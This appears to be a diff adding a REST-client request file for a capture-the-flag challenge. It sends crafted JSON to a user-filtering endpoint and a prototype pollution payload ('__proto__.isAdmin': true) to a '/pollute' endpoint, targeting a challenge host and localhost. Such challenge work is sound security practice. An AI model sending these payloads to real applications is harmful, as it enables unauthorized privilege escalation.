@@ -1,0 +1,29 @@
+@url = https://chal42-hj4589.vercel.app
+@devUrl = http://localhost:3000
+@payload1 = "value": { "__proto__": "test@example.com" }
+
+POST {{url}}/filterCRMUsers HTTP/1.1
+Content-Type: application/json
+
+{
+  "field": ["firstName",""]
+}
+
+###
+
+POST {{devUrl}}/filterCRMUsers HTTP/1.1
+Content-Type: application/json
+
+{ 
+  "field": ["firstName",[""]]
+}
+
+
+###
+
+POST {{devUrl}}/pollute HTTP/1.1
+Content-Type: application/json
+
+{
+	"__proto__.isAdmin": true
+}
